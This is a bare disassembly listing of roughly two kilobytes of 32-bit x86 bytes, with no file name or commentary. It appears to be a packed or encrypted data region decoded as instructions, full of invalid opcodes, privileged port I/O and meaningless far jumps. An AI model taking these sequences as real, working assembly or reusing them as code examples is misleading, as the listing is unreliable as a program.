  419612:	loop   0x41965e
  419614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419615:	out    dx,eax
  419616:	xor    DWORD PTR [ebp+0x69c8c79a],eax
  41961c:	arpl   ax,cx
  41961e:	push   ss
  41961f:	push   0x7922ba63
  419624:	jno    0x4195b1
  419626:	int    0xe2
  419628:	xchg   ebx,eax
  419629:	mov    eax,0xdbefa4f7
  41962e:	(bad)  
  41962f:	jl     0x419696
  419631:	push   ebp
  419632:	es jb  0x41961c
  419635:	mov    ebp,0xa1167bca
  41963a:	iret   
  41963b:	adc    eax,0x184dd947
  419640:	or     ch,BYTE PTR [ebx]
  419642:	mov    eax,ds:0xda37bf05
  419647:	push   ds
  419648:	and    al,0xa6
  41964a:	jmp    0x419639
  41964c:	add    al,0xdc
  41964f:	fnstcw WORD PTR [edi-0x6f7e07b0]
  419655:	daa    
  419656:	shl    DWORD PTR [ecx],0xa0
  419659:	in     al,0x1f
  41965b:	jl     0x419694
  41965d:	sar    BYTE PTR [eax],0x9c
  419660:	dec    esi
  419661:	test   DWORD PTR [esp+esi*8+0x744d0415],ebp
  419668:	out    dx,al
  419669:	inc    ecx
  41966a:	ins    DWORD PTR es:[edi],dx
  41966b:	sub    DWORD PTR [esi-0x4a],ebx
  41966e:	es inc ecx
  419670:	sbb    BYTE PTR [edi+ebx*8-0x4cbdfdb],al
  419677:	sbb    al,BYTE PTR [ebx+0x70582588]
  41967d:	push   es
  41967e:	popf   
  41967f:	scas   al,BYTE PTR es:[edi]
  419680:	nop
  419681:	loopne 0x419697
  419683:	scas   al,BYTE PTR es:[edi]
  419684:	hlt    
  419685:	push   ecx
  419686:	dec    esp
  419687:	repnz aaa 
  419689:	lods   al,BYTE PTR ds:[esi]
  41968a:	adc    al,0x2c
  41968c:	add    BYTE PTR [ebx+0x2a92ad45],bl
  419692:	stc    
  419693:	or     DWORD PTR [edi-0x1f07ced4],eax
  419699:	cwde   
  41969a:	mov    ds:0x6de8b465,al
  41969f:	add    ebp,0x2d262ddf
  4196a5:	in     eax,0x5d
  4196a7:	and    eax,0xea117100
  4196ac:	mov    bl,0x6e
  4196ae:	cmp    eax,0x29fd32ba
  4196b3:	push   esp
  4196b4:	adc    DWORD PTR [ecx],esp
  4196b6:	pop    edx
  4196b7:	push   ebx
  4196b8:	adc    dh,BYTE PTR [edi]
  4196ba:	(bad)  
  4196bb:	out    dx,eax
  4196bc:	mov    DWORD PTR [eax],ecx
  4196be:	and    dh,bl
  4196c0:	inc    edx
  4196c1:	adc    dl,cl
  4196c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196c4:	popa   
  4196c5:	fcom   QWORD PTR [ecx]
  4196c7:	ficom  DWORD PTR [esi-0x787ebb4e]
  4196cd:	inc    edi
  4196ce:	addr16 mov ah,0x8
  4196d1:	cs push 0xfffffff1
  4196d4:	call   0xfbb9ed86
  4196d9:	outs   dx,BYTE PTR ds:[esi]
  4196da:	mov    esi,0x2185487c
  4196df:	gs mov esi,0x88fed998
  4196e5:	or     BYTE PTR [esi],dh
  4196e7:	mov    ah,0xc2
  4196e9:	mov    ebp,0x97a24d0a
  4196ee:	pop    ecx
  4196ef:	adc    ebx,DWORD PTR [ecx-0x2b]
  4196f2:	loope  0x419726
  4196f4:	not    al
  4196f6:	dec    edi
  4196f7:	cmp    al,0x74
  4196f9:	loope  0x4196e0
  4196fb:	lea    ebp,[esi]
  4196fd:	sbb    eax,0xa241bfa6
  419702:	ret    0x5341
  419705:	nop
  419706:	fmul   DWORD PTR [ebp-0x4]
  419709:	jp     0x4196c8
  41970b:	ret    
  41970c:	sbb    eax,0x1d9d6871
  419711:	nop
  419712:	cdq    
  419713:	inc    esi
  419714:	jecxz  0x41970e
  419716:	aas    
  419717:	mov    al,ds:0xbb739256
  41971c:	pop    es
  41971d:	popf   
  41971e:	in     al,dx
  41971f:	push   0x9c380155
  419724:	mov    ds:0xb2012db6,eax
  419729:	call   0x5348:0xf1ba6331
  419730:	jmp    0x6766:0xe6c7fdd9
  419737:	dec    ebp
  419738:	stc    
  419739:	std    
  41973a:	dec    esp
  41973b:	xlat   BYTE PTR ds:[ebx]
  41973c:	xlat   BYTE PTR ds:[ebx]
  41973d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41973e:	in     eax,0xef
  419740:	xor    eax,0x5abd72bb
  419745:	in     al,dx
  419746:	ja     0x419712
  419748:	jmp    0x3bb2dc6e
  41974d:	jnp    0x419729
  41974f:	and    DWORD PTR [edi],edx
  419751:	retf   
  419752:	js     0x41972b
  419754:	jbe    0x419732
  419756:	fcmove st,st(4)
  419758:	adc    BYTE PTR [eax],0xad
  41975b:	xchg   ebx,eax
  41975c:	jge    0x4197bc
  41975e:	pop    ecx
  41975f:	mov    cl,0xd3
  419761:	enter  0x8195,0xdd
  419765:	loopne 0x4197a7
  419767:	mov    eax,ds:0x990bc208
  41976c:	jmp    0x419705
  41976e:	pop    ebx
  41976f:	and    BYTE PTR [ebx+0x7c],bl
  419772:	or     dl,ch
  419774:	ins    BYTE PTR es:[edi],dx
  419775:	out    dx,eax
  419776:	sbb    DWORD PTR [eax-0xf],ecx
  419779:	push   ss
  41977a:	mov    edi,0xf05fb033
  41977f:	shl    al,0xc7
  419782:	leave  
  419783:	pop    ebx
  419784:	inc    eax
  419785:	fdivp  st(6),st
  419787:	clc    
  419788:	jbe    0x4197b4
  41978a:	lods   al,BYTE PTR ds:[esi]
  41978b:	stos   DWORD PTR es:[edi],eax
  41978c:	jg     0x4197de
  41978e:	jns    0x419797
  419790:	sti    
  419791:	push   eax
  419792:	je     0x419752
  419794:	jecxz  0x4197ef
  419796:	cs dec ecx
  419798:	jmp    0xcdce799e
  41979d:	pop    ds
  41979e:	pusha  
  41979f:	repz sbb eax,DWORD PTR [ecx]
  4197a2:	cmp    edi,DWORD PTR [edi+ebx*8-0x41]
  4197a6:	push   edx
  4197a7:	iret   
  4197a8:	pop    edi
  4197a9:	sbb    al,0x5c
  4197ab:	dec    ecx
  4197ac:	add    dl,BYTE PTR [edi-0x26]
  4197af:	adc    DWORD PTR [ecx],edx
  4197b1:	je     0x4197d8
  4197b3:	cdq    
  4197b4:	push   ebx
  4197b5:	xchg   esp,eax
  4197b6:	sbb    eax,0xda527e7b
  4197bb:	push   es
  4197bc:	xor    esi,DWORD PTR [edx-0x184bf785]
  4197c2:	test   DWORD PTR [ebx+0x44441d1e],esi
  4197c8:	lds    ebx,FWORD PTR [ecx+0x2d49430a]
  4197ce:	pushf  
  4197cf:	or     ebp,DWORD PTR [edi+edx*4-0x15]
  4197d3:	mov    WORD PTR [ebx],ds
  4197d5:	push   ecx
  4197d6:	hlt    
  4197d7:	xchg   ebx,eax
  4197d8:	in     eax,dx
  4197d9:	and    ebp,0xffffff87
  4197dc:	es dec edi
  4197de:	pavgb  mm5,mm2
  4197e1:	mov    ah,0x9e
  4197e3:	fsubr  st,st(2)
  4197e5:	and    bh,BYTE PTR [eax]
  4197e7:	cmc    
  4197e8:	aaa    
  4197e9:	lods   eax,DWORD PTR ds:[esi]
  4197ea:	mov    DWORD PTR [eax-0x6f],0x56412d1c
  4197f1:	mov    WORD PTR [esi*8+0x2b956d6b],gs
  4197f8:	nop
  4197f9:	mov    esp,0x4b7d0b5d
  4197fe:	sbb    BYTE PTR [ebx+0x34c1baf],bl
  419804:	loopne 0x4197ef
  419806:	iret   
  419807:	lds    ebx,FWORD PTR [esi+0x2e]
  41980a:	jmp    0x494baaa5
  41980f:	test   eax,0x2251707f
  419814:	pop    es
  419815:	jb     0x41982c
  419817:	test   ebx,0xb9176f78
  41981d:	call   0xc7:0x6f6cf638
  419824:	dec    ebx
  419825:	sbb    esp,DWORD PTR [esi]
  419827:	push   esi
  419828:	add    DWORD PTR [esi-0x3e],esp
  41982b:	imul   BYTE PTR [edx+ecx*1-0x2fee6e35]
  419832:	stc    
  419833:	or     edi,DWORD PTR [ecx+0x4d18a118]
  419839:	add    eax,0xbfa29802
  41983e:	aaa    
  41983f:	xchg   edx,eax
  419840:	xchg   ecx,eax
  419841:	test   ebp,esp
  419843:	mov    eax,0x53c6711e
  419848:	adc    dl,BYTE PTR [esi+edi*1-0x6207e56e]
  41984f:	loopne 0x419885
  419851:	push   cs
  419852:	xchg   edx,eax
  419853:	add    ebp,DWORD PTR [eax-0x3a6d0be0]
  419859:	push   eax
  41985a:	std    
  41985b:	xor    al,dl
  41985d:	call   0x80d9:0x859e167f
  419864:	aas    
  419865:	mov    DWORD PTR ds:0x943ec3b9,edx
  41986b:	fistp  WORD PTR [edx]
  41986d:	add    dl,dh
  41986f:	loop   0x4198d1
  419871:	xchg   edi,ecx
  419873:	inc    esi
  419874:	add    eax,0x3d84e7eb
  419879:	push   ebp
  41987a:	ins    BYTE PTR es:[edi],dx
  41987b:	loopne 0x4198db
  41987d:	mov    bl,0x19
  41987f:	xor    dl,ch
  419881:	(bad)  
  419882:	adc    eax,0xa6792e22
  419887:	fistp  QWORD PTR [ebp+ebx*8+0x63]
  41988b:	mov    ch,0xbe
  41988d:	in     eax,0x73
  41988f:	or     BYTE PTR [ebx+0x23],bh
  419892:	fcomp  DWORD PTR [edx]
  419894:	mov    bh,BYTE PTR [ebp-0x55]
  419897:	sub    BYTE PTR [ecx],al
  419899:	(bad)  
  41989a:	out    dx,eax
  41989b:	push   es
  41989c:	xchg   edx,eax
  41989d:	xchg   DWORD PTR [edx],ebp
  41989f:	adc    ch,BYTE PTR [ecx]
  4198a1:	aam    0x29
  4198a3:	test   eax,0x5791a7d7
  4198a8:	out    0x96,al
  4198aa:	in     eax,0x71
  4198ac:	test   DWORD PTR [esi],ebx
  4198ae:	das    
  4198af:	sti    
  4198b0:	jg     0x41988d
  4198b2:	jl     0x4198b7
  4198b4:	(bad)  
  4198b5:	fidiv  DWORD PTR [eax+0x4b046e42]
  4198bb:	pop    esi
  4198bc:	xor    edx,esp
  4198be:	(bad)  
  4198bf:	mov    WORD PTR [edi],?
  4198c1:	or     eax,0x592fecbd
  4198c6:	dec    ebx
  4198c7:	es jne 0x419866
  4198ca:	int3   
  4198cb:	call   DWORD PTR [ebx-0x6]
  4198ce:	and    al,BYTE PTR [edx+esi*4+0x13c68880]
  4198d5:	sub    eax,0xec642456
  4198da:	js     0x419913
  4198dc:	inc    ecx
  4198dd:	sahf   
  4198de:	sub    al,dl
  4198e0:	sar    BYTE PTR [bx+di+0x6b],cl
  4198e4:	inc    ecx
  4198e5:	xor    al,0x91
  4198e7:	cmc    
  4198e8:	mov    fs,WORD PTR [edi]
  4198ea:	and    edx,esi
  4198ec:	fist   DWORD PTR [eax-0x17]
  4198ef:	push   0x7459d4a9
  4198f4:	leave  
  4198f5:	jmp    0x419922
  4198f7:	test   eax,0x1cda24be
  4198fc:	jns    0x88481195
  419902:	aad    0xbd
  419904:	xchg   BYTE PTR [ecx+0x56670ee2],bh
  41990a:	mov    ebx,0x2aa02922
  41990f:	xchg   ebp,eax
  419910:	scas   al,BYTE PTR es:[edi]
  419911:	ror    esi,0x93
  419914:	sub    DWORD PTR [eax+0x7],esi
  419917:	push   ecx
  419918:	mov    dl,BYTE PTR [ebp+0x37e1433a]
  41991e:	test   ecx,ecx
  419920:	pop    ecx
  419921:	jge    0x419917
  419923:	test   al,0x5d
  419925:	sbb    ebp,DWORD PTR [eax]
  419927:	jne    0x4198c2
  419929:	(bad)  [edx]
  41992b:	loop   0x41991e
  41992d:	sub    eax,0x7e018a1b
  419932:	(bad)  
  419933:	fstp   DWORD PTR [ebp+0x6826bd4]
  419939:	mul    bh
  41993b:	popf   
  41993c:	mov    WORD PTR [ebx-0x1],gs
  41993f:	shr    DWORD PTR [esi-0x2b003fe9],cl
  419945:	pop    esi
  419946:	scas   al,BYTE PTR es:[edi]
  419947:	lods   eax,DWORD PTR ds:[esi]
  419948:	xchg   DWORD PTR [esi+eiz*8+0x4b],ebp
  41994c:	cdq    
  41994d:	leave  
  41994e:	xor    al,0x6b
  419950:	fs push es
  419952:	inc    ebx
  419953:	jo     0x41992f
  419955:	mov    esp,0xe9868b4e
  41995a:	jne    0x419971
  41995c:	addr16 push ebx
  41995e:	xchg   BYTE PTR [esi+0x788d25db],cl
  419964:	adc    eax,0xff45851f
  419969:	in     al,0x97
  41996b:	cmp    esi,DWORD PTR [eax]
  41996d:	or     al,ch
  41996f:	int3   
  419970:	adc    edi,edx
  419972:	jne    0x4199da
  419974:	addr16 inc esi
  419976:	repnz pusha 
  419978:	mov    ah,0xc2
  41997a:	mov    ebx,0x68527b4f
  41997f:	lods   eax,DWORD PTR ds:[esi]
  419980:	push   0x8eadd97f
  419985:	ss mov al,0x5a
  419988:	sub    eax,0x219a8dc1
  41998d:	dec    esp
  41998e:	imul   esi,DWORD PTR [edi+eax*2-0x769579c3],0xf9c59544
  419999:	(bad)
  41999c:	add    al,BYTE PTR [edi+ebx*4-0x20743114]
  4199a3:	pop    es
  4199a4:	or     dh,ah
  4199a6:	lea    edi,ds:0xd2a96d74
  4199ac:	dec    esi
  4199ad:	jmp    FWORD PTR [edx-0x6bfeb186]
  4199b3:	xchg   ebx,eax
  4199b4:	das    
  4199b5:	mov    edi,0x3c668f6e
  4199ba:	pop    ebp
  4199bb:	setae  BYTE PTR [edx]
  4199be:	and    ebp,DWORD PTR [ebx-0x6b]
  4199c1:	test   eax,0x32e27ab
  4199c6:	test   eax,0xe0ed9ef1
  4199cb:	mov    ds:0x55a7d51e,eax
  4199d0:	jp     0x419a2a
  4199d2:	lock sub BYTE PTR [edx+0x22],dh
  4199d6:	jnp    0x4199a1
  4199d8:	inc    eax
  4199d9:	inc    ebx
  4199da:	scas   al,BYTE PTR es:[edi]
  4199db:	and    dh,bl
  4199dd:	cmp    eax,0x346341ff
  4199e2:	cmp    DWORD PTR [ecx+eax*8+0x127d4701],eax
  4199e9:	out    0x75,eax
  4199eb:	add    ebp,ebp
  4199ed:	pop    es
  4199ee:	pop    ebx
  4199ef:	into   
  4199f0:	mov    edx,0x9370df8e
  4199f5:	sahf   
  4199f6:	js     0x419a66
  4199f8:	add    al,0x27
  4199fa:	and    eax,0x72ef08ac
  4199ff:	xchg   edx,eax
  419a00:	cmc    
  419a01:	shl    BYTE PTR [ecx],cl
  419a03:	mov    cl,0xe
  419a05:	stos   DWORD PTR es:[edi],eax
  419a06:	sbb    ecx,edi
  419a08:	xchg   ebp,eax
  419a09:	cmc    
  419a0a:	sub    eax,0x5593f049
  419a0f:	popa   
  419a10:	fsincos 
  419a12:	out    0x31,al
  419a14:	bound  edx,QWORD PTR [ebp+0x75]
  419a17:	mov    al,ds:0xbbe45533
  419a1c:	push   ds
  419a1d:	lods   al,BYTE PTR ds:[esi]
  419a1e:	sbb    al,dh
  419a20:	stc    
  419a21:	mov    dh,0x6a
  419a23:	inc    edx
  419a24:	xor    eax,0xe3774bf9
  419a29:	cmp    cl,ch
  419a2b:	mov    ds:0xe112e0f3,eax
  419a30:	add    eax,0x3a871f3e
  419a35:	fs sti 
  419a37:	add    ebx,DWORD PTR [esi]
  419a39:	retf   0x1f5a
  419a3c:	sar    BYTE PTR [ebx-0xe],cl
  419a3f:	repz in al,dx
  419a41:	inc    edi
  419a42:	adc    eax,DWORD PTR [ecx]
  419a44:	sbb    edi,DWORD PTR [edx]
  419a46:	jge    0x419a5f
  419a48:	sbb    dh,BYTE PTR [ebp-0x62]
  419a4b:	xchg   esi,eax
  419a4c:	mov    bl,0x8b
  419a4e:	mov    dh,0xa2
  419a50:	in     eax,dx
  419a51:	lods   al,BYTE PTR ds:[esi]
  419a52:	inc    eax
  419a53:	(bad)  
  419a54:	pop    ebp
  419a55:	pop    edi
  419a56:	cmp    esp,DWORD PTR [edi]
  419a58:	mov    ecx,0xcbed9aef
  419a5d:	cwde   
  419a5e:	pop    edx
  419a5f:	and    BYTE PTR [ebx-0x49c17a07],dh
  419a65:	push   0xaf79fc05
  419a6a:	mov    bh,0x1
  419a6c:	mov    esp,?
  419a6e:	add    bh,BYTE PTR [ebx]
  419a70:	lea    edx,[esi-0x14]
  419a73:	mov    esi,0x61185bcc
  419a78:	and    BYTE PTR [bx+si-0x4f8a],cl
  419a7d:	stos   BYTE PTR es:[edi],al
  419a7e:	pop    edi
  419a7f:	jb     0x419b00
  419a81:	fld    DWORD PTR [ebx-0x62]
  419a84:	jmp    0x419a42
  419a86:	aad    0x20
  419a88:	pop    ss
  419a89:	push   ebx
  419a8a:	jb     0x419ab4
  419a8c:	xor    ebx,DWORD PTR [ebp+eax*8+0x6a]
  419a90:	xor    DWORD PTR [ebp-0x4a],ebx
  419a93:	mov    eax,ds:0xf0c550d7
  419a98:	xor    eax,0xcd09d5da
  419a9d:	(bad)
  419aa2:	add    BYTE PTR [esi-0x55],cl
  419aa5:	dec    edi
  419aa6:	cwde   
  419aa7:	ret    0x3dcb
  419aaa:	xchg   esp,eax
  419aab:	les    edi,FWORD PTR [eax-0x6c]
  419aae:	fcmovnu st,st(7)
  419ab0:	inc    ebp
  419ab1:	add    ah,al
  419ab3:	jb     0x419a59
  419ab5:	iret   
  419ab6:	(bad)  
  419ab7:	out    dx,eax
  419ab8:	rcl    BYTE PTR [esi+0x34f7367d],1
  419abe:	lods   eax,DWORD PTR ds:[esi]
  419abf:	lahf   
  419ac0:	sbb    DWORD PTR [edx-0x1c],0xffffffd8
  419ac4:	and    ebx,DWORD PTR [esi-0xb]
  419ac7:	mov    ebp,0x8a50e433
  419acc:	mov    edx,0x7f6dc3c7
  419ad1:	inc    esp
  419ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ad3:	lea    ebx,[ebx]
  419ad5:	jo     0x419ae6
  419ad7:	jecxz  0x419ad3
  419ad9:	xchg   esi,eax
  419ada:	pop    ecx
  419adb:	sub    eax,0xcbcc0f7a
  419ae0:	test   BYTE PTR [ebp+0x56],dh
  419ae3:	test   DWORD PTR [edx*4+0x39e1022b],ebx
  419aea:	or     ebp,esi
  419aec:	in     eax,dx
  419aed:	jp     0x419abb
  419aef:	add    BYTE PTR [edx*8-0x5e88fd4e],0xdd
  419af7:	iret   
  419af8:	cmp    BYTE PTR [esi],dl
  419afa:	(bad)  
  419afb:	call   0xcd0d8be6
  419b00:	push   esp
  419b01:	pop    ecx
  419b02:	dec    edi
  419b03:	pop    es
  419b04:	adc    edx,ebx
  419b06:	or     DWORD PTR [ebx+0x171ce595],edi
  419b0c:	fistp  QWORD PTR [ecx]
  419b0e:	xor    bh,ch
  419b10:	rcl    ebx,0xdf
  419b13:	push   esp
  419b14:	adc    edi,DWORD PTR [esi]
  419b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b17:	fidiv  WORD PTR [edi-0x18]
  419b1a:	jns    0x419aa9
  419b1c:	inc    ebp
  419b1d:	lock aaa 
  419b1f:	jo     0x419b84
  419b21:	aaa    
  419b22:	aas    
  419b23:	repz es jg 0x419b41
  419b27:	lods   eax,DWORD PTR ds:[esi]
  419b28:	mov    al,ds:0x634a28b8
  419b2d:	out    0xf0,al
  419b2f:	test   edi,0x1898705b
  419b35:	loope  0x419ad7
  419b37:	test   eax,0x6453af5a
  419b3c:	jge    0x419b2d
  419b3e:	ins    BYTE PTR es:[edi],dx
  419b3f:	jmp    0xcd15:0x506624c0
  419b46:	mov    bh,0x4a
  419b48:	addr16 cli 
  419b4a:	leave  
  419b4b:	ins    DWORD PTR es:[edi],dx
  419b4c:	fwait
  419b4d:	out    0x38,eax
  419b4f:	test   al,0xd1
  419b51:	clc    
  419b52:	push   eax
  419b53:	xor    esp,DWORD PTR [ebx-0x17398d44]
  419b59:	push   ss
  419b5a:	push   esi
  419b5b:	jnp    0x419bd7
  419b5d:	aad    0x24
  419b5f:	pop    ebp
  419b60:	mov    ch,al
  419b62:	push   cs
  419b63:	cmp    eax,0x8ef341e3
  419b68:	in     al,dx
  419b69:	dec    ecx
  419b6a:	xchg   esp,eax
  419b6b:	mov    ecx,eax
  419b6d:	jo     0x419bbb
  419b6f:	cmp    esp,0x51
  419b72:	rcl    DWORD PTR [edi],1
  419b74:	dec    ebp
  419b75:	fist   WORD PTR [bx-0x3b]
  419b79:	adc    edx,edi
  419b7b:	or     eax,0x4ec66e0d
  419b80:	lods   al,BYTE PTR ds:[esi]
  419b81:	push   0x56b2bf58
  419b86:	ins    DWORD PTR es:[edi],dx
  419b87:	pop    ebp
  419b88:	add    ch,BYTE PTR [ecx-0x1606b3d]
  419b8e:	js     0x419b8e
  419b90:	ret    0x7e67
  419b93:	add    BYTE PTR [ecx+ebp*4],al
  419b96:	inc    edi
  419b97:	mov    eax,0xf3963c85
  419b9c:	loopne 0x419bd5
  419b9e:	rcr    DWORD PTR [esi+esi*2+0x31],0x5d
  419ba3:	jnp    0x419c05
  419ba5:	int    0x9f
  419ba7:	pop    ds
  419ba8:	pop    es
  419ba9:	sbb    DWORD PTR [esi],0xb793d500
  419baf:	mov    ds:0x3ae5e3f6,eax
  419bb4:	sbb    ebp,DWORD PTR [ecx]
  419bb6:	add    eax,0x59db80ed
  419bbb:	shr    BYTE PTR [edi-0x4c],cl
  419bbe:	mov    cl,0x55
  419bc0:	dec    esp
  419bc1:	or     al,0x54
  419bc3:	gs pop es
  419bc5:	dec    ebp
  419bc6:	sbb    DWORD PTR [ecx-0x24898be7],ecx
  419bcc:	aas    
  419bcd:	inc    edx
  419bce:	xor    al,0x6f
  419bd0:	add    esp,DWORD PTR [esp+eax*1+0x414a8215]
  419bd7:	and    esi,ebp
  419bd9:	jbe    0x419c38
  419bdb:	mov    al,0xe
  419bdd:	imul   esi,DWORD PTR [edi-0x1e01bca6],0xc7ab9454
  419be7:	lock sbb esp,DWORD PTR ss:[edi+0x5d]
  419bec:	loopne 0x419bb0
  419bee:	fisub  DWORD PTR [ecx]
  419bf0:	jl     0x419b85
  419bf2:	or     DWORD PTR [esp+esi*2-0x36475c9c],eax
  419bf9:	mov    ch,0x48
  419bfb:	stc    
  419bfc:	dec    eax
  419bfd:	iret   
  419bfe:	sub    BYTE PTR [esi-0x36528398],ch
  419c04:	jb     0x419bad
  419c06:	ud2    
  419c08:	mov    edi,0xf79f6d29
  419c0d:	push   eax
  419c0e:	bound  ecx,QWORD PTR [esi]
  419c10:	nop
  419c11:	xor    ah,BYTE PTR [ecx+ebx*4+0x7992e9c0]
  419c18:	out    0x74,eax
  419c1a:	in     al,dx
  419c1b:	iret   
  419c1c:	fwait
  419c1d:	xlat   BYTE PTR ds:[ebx]
  419c1e:	mov    BYTE PTR [ecx+ebx*2-0x3721254a],al
  419c25:	fistp  QWORD PTR [ebp+ebx*4-0x4]
  419c29:	cmp    cl,BYTE PTR [ecx+ebp*2-0x55]
  419c2d:	pop    ebx
  419c2e:	mov    edx,0xa22f7ccc
  419c33:	mov    ch,0x4
  419c35:	jge    0x419c97
  419c37:	push   esi
  419c38:	(bad)  
  419c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c3b:	push   ebp
  419c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c3d:	mov    eax,fs:0xcfff7503
  419c43:	lea    ecx,[edx+0x2e]
  419c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c47:	xchg   edi,eax
  419c48:	aas    
  419c49:	pop    eax
  419c4a:	lahf   
  419c4b:	cmp    ecx,DWORD PTR [bx+si-0x27]
  419c4f:	pop    ds
  419c50:	mov    cl,0x55
  419c52:	push   eax
  419c53:	mov    dh,0x14
  419c55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c56:	sub    dh,ah
  419c58:	test   eax,0x42845b8
  419c5d:	mov    ebx,0x630399f
  419c62:	sahf   
  419c63:	in     eax,dx
  419c64:	in     eax,0x89
  419c66:	popa   
  419c67:	arpl   WORD PTR [ebx-0x499bed7e],dx
  419c6d:	mov    ds:0xcab366ce,eax
  419c72:	stos   DWORD PTR es:[edi],eax
  419c73:	pop    esi
  419c74:	leave  
  419c75:	xchg   ebx,eax
  419c76:	cmp    eax,0x7caf4fc2
  419c7b:	push   cs
  419c7c:	lock mov esi,0x649a17c
  419c82:	pop    edx
  419c83:	pop    edx
  419c84:	xchg   esi,eax
  419c85:	or     bh,ch
  419c87:	jmp    0x419ccc
  419c89:	repz enter 0x8cfd,0x83
  419c8e:	retf   
  419c8f:	fisttp QWORD PTR [eax+0x3f2893c8]
  419c95:	scas   al,BYTE PTR es:[edi]
  419c96:	dec    edx
  419c97:	inc    ecx
  419c98:	dec    ebx
  419c99:	call   0xb49e45dd
  419c9e:	pop    edi
  419c9f:	repz mov ah,0x6a
  419ca2:	push   ss
  419ca3:	xor    cl,BYTE PTR [ecx+esi*1+0x5d]
  419ca7:	dec    ecx
  419ca8:	mul    esp
  419caa:	loop   0x419cbf
  419cac:	push   esi
  419cad:	out    0xfe,eax
  419caf:	out    dx,al
  419cb0:	jmp    0x38b283e0
  419cb5:	mov    bl,0x0
  419cb7:	ficomp WORD PTR [ecx-0x4c847e5b]
  419cbd:	push   eax
  419cbe:	pop    ss
  419cbf:	jp     0x419cf4
  419cc1:	mov    dh,0x99
  419cc3:	int    0x87
  419cc5:	xor    DWORD PTR [esp+0x1f7249b6],eax
  419ccc:	mov    eax,0x595368e0
  419cd1:	iret   
  419cd2:	mov    ds:0x82acc8ed,al
  419cd7:	sub    ah,BYTE PTR [esi+ebx*2+0x2]
  419cdb:	popa   
  419cdc:	aaa    
  419cdd:	add    ebx,0x17
  419ce0:	adc    eax,0x421c3990
  419ce5:	jno    0x419cba
  419ce7:	fiadd  DWORD PTR [edi-0x47]
  419cea:	xor    al,0xe9
  419cec:	pop    ebx
  419ced:	mov    dh,BYTE PTR [edx-0xf]
  419cf0:	popa   
  419cf1:	sbb    esi,eax
  419cf3:	or     al,0xb7
  419cf5:	add    esp,edi
  419cf7:	jnp    0x419d14
  419cf9:	test   ebx,ebp
  419cfb:	jge    0x419c99
  419cfd:	sti    
  419cfe:	int3   
  419cff:	ds inc edx
  419d01:	pop    esp
  419d02:	jp     0x419d2d
  419d04:	test   bl,bh
  419d06:	mov    bl,cl
  419d08:	pop    ebx
  419d09:	sub    esp,DWORD PTR [ebp-0x48]
  419d0c:	lods   eax,DWORD PTR ds:[esi]
  419d0d:	dec    eax
  419d0e:	push   ebx
  419d0f:	adc    ebp,DWORD PTR [ecx-0xe82cd14]
  419d15:	stos   DWORD PTR es:[edi],eax
  419d16:	mov    dl,0x57
  419d18:	dec    ebx
  419d19:	cmp    dl,ch
  419d1b:	sbb    BYTE PTR [ebx],ah
  419d1d:	add    dl,al
  419d1f:	mov    ds:0xa41403f2,al
  419d24:	pop    es
  419d25:	mov    WORD PTR [ecx+ecx*4+0x3353f74],?
  419d2c:	das    
  419d2d:	retf   0xb289
  419d30:	pusha  
  419d31:	int3   
  419d32:	inc    esp
  419d33:	jae    0x419d13
  419d35:	cmp    eax,0xe34540ca
  419d3a:	int    0x45
  419d3c:	sub    eax,0xec4c364b
  419d41:	aaa    
  419d42:	pop    ebx
  419d43:	(bad)
  419d47:	xchg   ebp,eax
  419d48:	or     eax,0xb8ceec5c
  419d4d:	mov    ch,0xf6
  419d4f:	xchg   BYTE PTR gs:[esi+0x57a1e5],ch
  419d56:	pushf  
  419d57:	sub    eax,0x30db552d
  419d5c:	sub    edi,DWORD PTR [edi+0x61c82c94]
  419d62:	das    
  419d63:	push   esi
  419d64:	sub    bl,ah
  419d66:	nop
  419d67:	add    ecx,DWORD PTR [esi-0x48abcd05]
  419d6d:	subps  xmm5,XMMWORD PTR [ecx-0x41da4f1f]
  419d74:	int    0x5a
  419d76:	loopne 0x419dde
  419d78:	mov    al,ds:0x68568b6e
  419d7d:	pop    es
  419d7e:	mov    eax,edx
  419d80:	and    dl,dl
  419d82:	mov    eax,ds:0x86635433
  419d87:	mov    ds:0x2b5b4dc1,eax
  419d8c:	ins    DWORD PTR es:[edi],dx
  419d8d:	xchg   al,dl
  419d8f:	or     bh,BYTE PTR [edx+eiz*1+0x8]
  419d93:	xor    DWORD PTR [ebp+0x7a],0x20
  419d97:	fisttp QWORD PTR [ecx]
  419d99:	aas    
  419d9a:	pop    ds
  419d9b:	and    eax,0xa405bb2b
  419da0:	cld    
  419da1:	mov    ds:0x90cc234d,eax
  419da6:	or     DWORD PTR [esi-0x3b],0xdd633656
  419dad:	dec    esp
  419dae:	daa    
  419daf:	add    esi,edi
  419db1:	lahf   
  419db2:	add    eax,DWORD PTR [edi+0x2f696b71]
  419db8:	jb     0x419d86
  419dba:	ins    BYTE PTR es:[edi],dx
  419dbb:	push   esp
  419dbc:	mov    ah,0xbf
  419dbe:	invd   
  419dc0:	adc    BYTE PTR [edi-0x2f],dh
  419dc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dc4:	mov    ds:0x6bfcafed,eax
  419dc9:	arpl   di,si
  419dcb:	sbb    dl,BYTE PTR [edi]
  419dcd:	test   ebx,0x32733cc1
  419dd3:	dec    eax
  419dd4:	add    eax,0xb3fa204c
  419dd9:	xchg   edx,eax
  419dda:	jno    0x419e1f
  419ddc:	mov    gs,ebp
  419dde:	mov    DWORD PTR [edi],eax
  419de0:	pop    DWORD PTR [ebx]
  419de2:	push   ebp
  419de3:	mov    esp,0xf483b72b
  419de8:	dec    esi
  419de9:	fdiv   st,st(2)
  419deb:	loop   0x419e60
  419ded:	jg     0x419de5
  419def:	mul    BYTE PTR [esi+0x7b16ca7a]
  419df5:	mov    bh,0x59
  419df7:	sub    BYTE PTR [ecx+esi*2-0x3944fcd7],dh
  419dfe:	cs dec eax
  419e00:	adc    edi,DWORD PTR [edi+ecx*1+0x9aee08b]
